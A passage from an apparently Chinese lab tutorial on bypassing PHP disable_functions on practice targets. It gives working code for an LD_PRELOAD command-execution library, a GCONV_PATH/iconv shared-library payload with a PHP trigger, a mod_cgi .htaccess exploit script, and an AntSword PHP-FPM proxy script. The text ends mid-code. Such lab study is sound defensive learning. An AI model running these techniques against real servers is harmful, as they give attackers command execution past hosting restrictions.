<p>注：<code>unsetenv()</code>可能在CentOS上无效，因为CentOS自己也hook了unsetenv()，在其内部启动了其他进程，来不及删除<code>LD_PRELOAD</code>就又被劫持，导致无限循环，可以使用全局变量 <code>extern char** environ</code>删除，实际上，<code>unsetenv()</code>就是对 <code>environ</code> 的简单封装实现的环境变量删除功能。</p>
<p>在<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c看到了一个小技巧：">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c看到了一个小技巧：</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用for循环修改<code>LD_PRELOAD</code>的首个字符改成<code>\0</code>这样可以使系统原有的环境变量自动失效。</p>
<h2 id="利用-GCONV-PATH-与-iconv"><a href="#利用-GCONV-PATH-与-iconv" class="headerlink" title="利用 GCONV_PATH 与 iconv"></a>利用 GCONV_PATH 与 iconv</h2><p><strong>原理简介</strong>：</p>
<p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做<code>iconv_open()</code>。</p>
<p>linux系统提供了一个环境变量：<code>GCONV_PATH</code>，该环境变量能够使<code>glibc</code>使用用户自定义的<code>gconv-modules</code>文件，因此，如果指定了<code>GCONV_PATH</code>的值，<code>iconv_open</code>函数的执行过程会如下：</p>
<ol>
<li><code>iconv_open</code>函数依照<code>GCONV_PATH</code>找到<code>gconv-modules</code>文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个<code>.so</code>文件中，即<code>gconv-modules</code>文件提供了各个字符集的<code>.so</code>文件所在位置。</li>
<li>根据<code>gconv-modules</code>文件的指示找到参数对应的<code>.so</code>文件。</li>
<li>调用<code>.so</code>文件中的<code>gconv()</code>和<code>gonv_init()</code>函数。</li>
<li>一些其他步骤。</li>
</ol>
<p>我们的利用方式就是首先在某一文件夹（一般是<code>/tmp</code>）中上传<code>gconv-modules</code>文件，文件中指定我们自定义的字符集文件的<code>.so</code>，然后我们再在<code>.so</code>文件中的<code>gonv_init()</code>函数中书写命令执行函数，之后上传php的shell，内容是使用php设定<code>GCONV_PATH</code>指向我们的<code>gconv-modules</code>文件，然后使用<code>iconv</code>函数使我们的恶意代码执行。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li><code>putenv</code>可用</li>
<li>PHP安装了<code>iconv</code>相关模块</li>
<li>存在可写的目录，需要上传 <code>.so</code> 文件</li>
</ul>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/nq9mRGNOyt1IACa.png" alt="image-20220109140408196"></p>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9</a></p>
<p><strong>靶场突破</strong>：</p>
<p>首先上传gconv-modules文件于/tmp文件夹，其内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2</span><br><span class="line">module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2</span><br></pre></td></tr></table></figure>
<p>在本地编写<code>payload.c</code>文件，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pwned&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;tac /flag &gt; /var/www/html/flag.txt&quot;</span>);		<span class="comment">//需要执行的命令</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将c文件编译为so文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc payload.c -o payload.so -shared -fPIC</span><br></pre></td></tr></table></figure>
<p>使用蚁剑将<code>payload.so</code>上传至目标靶机的<code>/tmp/</code>目录下</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/p8zGmrDWNMxulof.png" alt="image-20220109152304087"></p>
<p>编写<code>exp.php</code>上传至web目录下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	putenv(<span class="string">&quot;GCONV_PATH=/tmp&quot;</span>);</span><br><span class="line">	iconv(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问<code>exp.php</code>页面即可执行命令</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/09/fXBZP7vzR4TqHua.png" alt="image-20220109152234554"></p>
<h2 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h2><p><strong>原理简介</strong>：</p>
<p>CGI：CGI ，公共网关接口，它是 Web 服务器与外部应用程序（CGI 程序）之间传递信息的接口。通过 CGI 接口 Web 服务器就能够将客户端提交的信息转交给服务器端的 CGI 程序处理，最后返回结果给客户端。CGI是放在服务器上的可执行程序，CGI编程没有特定的语言，C语言、linux shell、perl、vb等等都可以进行CGI编程。</p>
<p>MOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>Apache + PHP (apache 使用 apache_mod_php)</li>
<li>Apache 开启了 <code>cgi</code>, <code>rewrite</code></li>
<li>Web 目录给了 <code>AllowOverride</code> 权限</li>
<li>当前目录可写</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3</a></p>
<blockquote>
<p>disable_functions比之前的多了<code>putenv</code></p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>若是想临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用<code>.htaccess</code>文件进行配置</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .dizzle</span><br></pre></td></tr></table></figure>
<p>然后设置<code>.dizzle</code>结尾的shell文件(<code>shell.dizzle</code>)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo -ne &quot;Content-Type: text/html\n\n&quot;</span><br><span class="line">tac /flag</span><br></pre></td></tr></table></figure>
<p>将shell.dizzle的权限改为0777</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/03/79zCLb3ty8mlRhf.png" alt="image-20220103004105994"></p>
<p>访问shell.dizzle即可执行命令</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/03/ZYNHOWueaV9U6Qk.png" alt="image-20220103004931720"></p>
<blockquote>
<p>注：由于Windows 系统中：每行结尾是 “<code>&lt;回车&gt;&lt;换行&gt;</code>“，即 “<code>\r\n</code>“；而UNIX/Linux中：每行结尾是 “<code>&lt;换行&gt;</code>“，即 “<code>\n</code>“，所以在写<code>shell.dizzle</code>文件时必须使用手打，复制粘贴会报错误。</p>
</blockquote>
<p>也可以使用如下EXP进行自动生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;tac /flag&quot;</span>; <span class="comment">//command to be executed</span></span><br><span class="line"><span class="variable">$shellfile</span> = <span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//using a shellscript</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span>(<span class="params"><span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span></span>) //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ? <span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">@file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] . <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$modcgi</span> = in_array(<span class="string">&#x27;mod_cgi&#x27;</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line"><span class="variable">$writable</span> = is_writable(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//current dir writable?</span></span><br><span class="line"><span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">checkEnabled(<span class="string">&quot;Mod-Cgi enabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">checkEnabled(<span class="string">&quot;Is writable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">checkEnabled(<span class="string">&quot;htaccess working&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span> &amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="comment">//abort if not</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">checkEnabled(<span class="string">&quot;Backing up .htaccess&quot;</span>,copy(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">checkEnabled(<span class="string">&quot;Write .htaccess file&quot;</span>,file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">checkEnabled(<span class="string">&quot;Write shell file&quot;</span>,file_put_contents(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//write the file</span></span><br><span class="line">checkEnabled(<span class="string">&quot;Chmod 777&quot;</span>,chmod(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//rwx</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//call the script</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问test.php后，会生成<code>.htacess</code>和<code>shell.dizzle</code>文件，文件内容与前面的是一样的。</p>
<p>最后访问<code>shell.dizzle</code>可以得到flag。</p>
<h2 id="攻击-PHP-FPM-监听端口"><a href="#攻击-PHP-FPM-监听端口" class="headerlink" title="攻击 PHP-FPM 监听端口"></a>攻击 PHP-FPM 监听端口</h2><blockquote>
<p>有关PHP-FPM我在<a href="https://plumeria.ltd/post/ecd40306.html">利用SSRF渗透内网主机·中</a>一节中有提到过，不过讲的并不透彻。</p>
<p>推荐大家可以参考一下P神的这篇文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 </a>。</p>
</blockquote>
<p><strong>原理简介</strong>：</p>
<p>我查阅了一些相关文章，有关利用PHP-FPM绕过disable_functions，很多都是套用P神的脚本，利用PHP-FPM未授权伪造发送请求。但是这种情况并不能绕过disable_functions，因为本质上还是原来的php解释器来解析，还是会加载php.ini。</p>
<p>而使用蚁剑扩展插件的原理简单的来讲就是：<strong>利用PHP-FPM加载一个恶意的ext，使得新启动一个PHP Server后，流量通过<code>.antproxy.php</code>转发到无disabe_functions的PHP Server上，以此达成bypass。</strong></p>
<p>所以这一部分我是直接使用蚁剑的扩展插件进行突破，再对其原理进行分析。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP-FPM</li>
<li>存在可写的目录, 需要上传 <code>.so</code> 文件</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p>
<p><strong>靶场突破</strong>：</p>
<p>在蚁剑的插件中心找到“绕过disable_functions”插件并下载安装</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/1Xud2aQIewtVOCW.png" alt="image-20220105121455453"></p>
<blockquote>
<p>也可选择下载源码并拷贝至 <code>antSword/antData/plugins/</code>进行手动安装。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions">https://github.com/Medicean/as_bypass_php_disable_functions</a></p>
</blockquote>
<p>添加WebShell完成后，使用「绕过 disable_functions」插件</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/cuVYGC9ZWoltMpn.png" alt="image-20220105122201864"></p>
<p>选择 <code>PHP-FPM/FastCGI</code> 模式进行</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/FZtrxCQulBoEJK9.png" alt="image-20220105122257482"></p>
<p>注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，默认的是 <code>unix:///</code> 本地 socket 这种的，如果配置成 TCP 的默认是 <code>127.0.0.1:9000</code>。在本例中，FPM 运行在 <code>127.0.0.1:9000</code>端口</p>
<p>点击「开始」按钮，可以看到成功上传了一个ext、执行了某项操作与上传了一个代理脚本。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/rETciF71vgjLI95.png" alt="image-20220105122552195"></p>
<p>成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件。我们创建副本，并将连接的 URL shell 脚本名字改为 <code>.antproxy.php</code>，就可以成功执行命令。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/LBdi8Nev1ykIFzS.png" alt="image-20220105123104199"></p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/I1rHiyhvYC7nuVN.png" alt="image-20220105123853225"></p>
<p><strong>原理分析</strong>：</p>
<p>很明显的是蚁剑在服务器上传了 1 个 <code>so</code> 库，和一个<code>.antproxy.php</code></p>
<p>上服务器先看下<code>.antproxy.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=strtolower(preg_replace(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=preg_replace_callback(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=preg_replace(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=str_replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtoupper(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=explode(<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=parseHeader(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=get_client_header();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">61568</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.strlen(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> .= implode(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"></span><br><span class="line">fputs(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span 